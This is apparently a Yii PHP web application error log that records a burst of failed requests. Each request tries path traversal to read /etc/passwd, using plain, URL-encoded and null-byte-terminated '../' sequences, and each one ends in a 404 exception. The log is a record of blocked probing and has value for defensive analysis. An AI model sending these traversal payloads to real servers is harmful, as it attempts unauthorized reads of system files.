REQUEST_URI=/index.php
---
2013/09/05 10:27:56 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "../../../../../../../../../../../../../../../../../etc/passwd".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('../../../../../...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
---
2013/09/05 10:27:57 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('..%2F..%2F..%2F...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php
---
2013/09/05 10:27:57 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "../../../../../../../../../../../../../../../../../etc/passwd' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('../../../../../...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php?r=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
---
2013/09/05 10:27:58 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('..%2F..%2F..%2F...')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/index.php
---
